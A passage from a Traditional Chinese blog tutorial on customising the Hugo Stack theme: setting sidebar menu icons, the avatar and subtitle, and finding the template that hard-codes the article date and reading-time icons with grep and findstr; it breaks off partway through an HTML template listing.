&lt;p&gt;參照作者的文件: &lt;a class=&#34;link&#34; href=&#34;https://docs.stack.jimmycai.com/configuration/custom-menu.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://docs.stack.jimmycai.com/configuration/custom-menu.html&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;左側的 Sidebar 又稱菜單或 Menu，可以從(1) &lt;code&gt;config.yaml&lt;/code&gt; 檔中設定，或是從(2) &lt;em&gt;/content/page&lt;/em&gt; 底下 md 檔的標頭(Markdown Front Matter)設定。首頁圖示以及其他項目只能從 config 檔中設定，格式為:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;identifier&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;home&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;首頁&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;weight&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;-&lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;pre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;blog-lineal/home&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;### For demonstration purpose, the home link will be open in a new tab&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;newTab&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;identifier&lt;/code&gt;: Item ID (指該 menu item 對應到哪個檔案??)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;name&lt;/code&gt;: Display text (左側選單上 menu item 的文字)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;url&lt;/code&gt;: Link (該頁面的路由)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;weight&lt;/code&gt;: Priority of the item, lower value means higher priority. (排序，數值越小越上面)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pre&lt;/code&gt;: Specify which SVG icon should be used (圖示)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;像是我將 &lt;code&gt;pre&lt;/code&gt; 改設為 &lt;code&gt;blog-lineal/home&lt;/code&gt;, theme 就會自動抓取 &lt;em&gt;assets/icons&lt;/em&gt; 目錄底下的 &lt;code&gt;blog-lineal/home.svg&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;其他-page-的圖示&#34;&gt;其他 Page 的圖示&lt;/h3&gt;
&lt;p&gt;其他 menu item 裡的頁面，模板預設寫在 &lt;em&gt;/content/page&lt;/em&gt; 的 md 檔中，以我的&amp;quot;文章庫&amp;quot;為例，一樣將 &lt;code&gt;pre&lt;/code&gt; field 改成我的 svg 圖片檔名。當然你想要把 &lt;code&gt;menu:&lt;/code&gt; 這部分挪到 config 檔裡統一設定也 OK。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nn&#34;&gt;---&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;文章庫&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;ld&#34;&gt;2019-05-28&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;layout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;archives&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# 哪種頁面樣板&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;slug&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;archives&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# 路由&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;weight&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;-&lt;span class=&#34;m&#34;&gt;70&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;pre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;blog-lineal/folder&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# icon&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;---&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;修改頭像&#34;&gt;修改頭像&lt;/h3&gt;
&lt;p&gt;順帶一提，大頭貼、副標題和網站名稱都可以在 config 中編輯。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;sidebar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;emoji&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;🇹🇼&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;subtitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;No&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;slave to the ordinary. Your legacy is yours to make.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;avatar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;enabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;img/avatar_cap_and_gown.jpg&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;修改文章發表日期閱讀時間的圖示&#34;&gt;修改文章發表日期、閱讀時間的圖示&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;做下去才發現這個超難搞 &amp;gt;&amp;lt;&lt;br&gt;
個人化修改可以參考: &lt;a class=&#34;link&#34; href=&#34;https://docs.stack.jimmycai.com/modify-theme/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://docs.stack.jimmycai.com/modify-theme/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;剛剛修改左側 Sidebar 時已經確認在整個 config.yaml 中 &lt;code&gt;pre&lt;/code&gt; field 只存在 Custom menu 的設定值裡，設定檔沒有其他地方使用 &lt;code&gt;pre&lt;/code&gt; field 來指定日期時間小圖示的檔名。在 &lt;code&gt;/page&lt;/code&gt; 的 FrontMatter 表頭裡也沒有這兩個圖示的賦值語法。恩&amp;hellip;這下尷尬了，不知道它藏在哪裡。&lt;/p&gt;
&lt;p&gt;由於官方文件對於 &lt;a class=&#34;link&#34; href=&#34;https://docs.stack.jimmycai.com/configuration/#date-format&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Date format&lt;/a&gt; 沒有多做描述，我們在 theme-stack 專案的 &lt;a class=&#34;link&#34; href=&#34;https://github.com/CaiJimmy/hugo-theme-stack/pull/204&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;feat(article): reading time #204&lt;/a&gt; 這個 pull request 中看到文章發表日期的圖示是 date.svg，以及閱讀書間的圖示是 time.svg (由下文推敲出次圖示於後來的版本被改成 clock.svg)。&lt;/p&gt;
&lt;p&gt;但還有一件事我們可以確定，就是這兩個 icon 的賦值一定存在專案的某個檔案片段，可能寫死在 theme 的 md 或是 html 裡面不讓使用者自訂義。所以還可以遍歷專案尋找哪裡有 date 或 time 字串。於是我打開 cmd 切到專案目錄下並輸入:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Bash&#34; data-lang=&#34;Bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ grep -r &lt;span class=&#34;s2&#34;&gt;&amp;#34;date&amp;#34;&lt;/span&gt; .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;grep&amp;#39;&lt;/span&gt; 不是內部或外部命令、可執行的程式或批次檔。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;蝦? 原來 windows 作業系統沒有 &lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/1987926/how-do-i-grep-recursively&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;grep 指令&lt;/a&gt;，還好有雷同的 &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/zh-tw/windows-server/administration/windows-commands/findstr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;findstr 指令&lt;/a&gt;，記得將結果輸出到 out.txt 不然直接 print 在 cmd 上往往會因字體編碼出錯。來試試:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Batchfile&#34; data-lang=&#34;Batchfile&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ findstr /si date *.* &lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; out.txt 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;打開 out.txt，看到 &amp;ldquo;helper/icon&amp;rdquo; &amp;ldquo;date&amp;rdquo; 這些關鍵字。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;268
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;269
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;270
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;271
&lt;/span&gt;&lt;span class=&#34;hl&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;272
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;273
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;themes\hugo-theme-stack\i18n\zh-CN.yaml:    lastUpdatedOn:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;themes\hugo-theme-stack\layouts\page\search.json:    {{- $data := dict &amp;#34;title&amp;#34; .Title &amp;#34;date&amp;#34; .Date &amp;#34;permalink&amp;#34; .Permalink &amp;#34;content&amp;#34; (.Plain) -}}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;themes\hugo-theme-stack\layouts\partials\article\components\details.html:    {{ if or (not .Date.IsZero) (.Site.Params.article.readingTime) }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;themes\hugo-theme-stack\layouts\partials\article\components\details.html:        {{ if not .Date.IsZero }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;themes\hugo-theme-stack\layouts\partials\article\components\details.html:                {{ partial &amp;#34;helper/icon&amp;#34; &amp;#34;date&amp;#34; }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;themes\hugo-theme-stack\layouts\partials\article\components\details.html:                    {{- .Date.Format (or .Site.Params.dateFormat.published &amp;#34;Jan 02, 2006&amp;#34;) -}}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;接著把 &lt;code&gt;themes\hugo-theme-stack\layouts\partials\article\components\details.html&lt;/code&gt; 翻出來看看，哇! bingo! 就是這個檔案指定了日期時間的小圖示。看來他是寫死在這個 component 裡面所以就只能修改這個 html 了。&lt;/p&gt;
&lt;p&gt;注意! 因為是修改 theme 的預設樣式，所以我們的 svg 圖檔資源要放在 &lt;code&gt;themes\hugo-theme-stack\assets\icon&lt;/code&gt; 裡，理當不能放在自己的 hugo 專案裡，如果你自己放了一包圖檔在資料夾中，圖檔名稱是可以包含路徑 e.g. &lt;code&gt;blog-linear/hourglass.svg&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;( Windows 的 dir 是 &lt;code&gt;\&lt;/code&gt; 反斜線，故意跟其他作業系統/程式語言不一樣。這裡 html 中的路徑須為 &lt;code&gt;/&lt;/code&gt; 斜線 )&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;hl&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;hl&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{ if or (not .Date.IsZero) (.Site.Params.article.readingTime) }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;footer&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;article-time&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {{ if not .Date.IsZero }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            {{ partial &amp;#34;helper/icon&amp;#34; &amp;#34;date&amp;#34; }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;time&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;article-time--published&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                {{- .Date.Format (or .Site.Params.dateFormat.published &amp;#34;Jan 02, 2006&amp;#34;) -}}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {{ end }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {{ if .Site.Params.article.readingTime }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            {{ partial &amp;#34;helper/icon&amp;#34; &amp;#34;clock&amp;#34; }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;time&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;article-time--reading&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
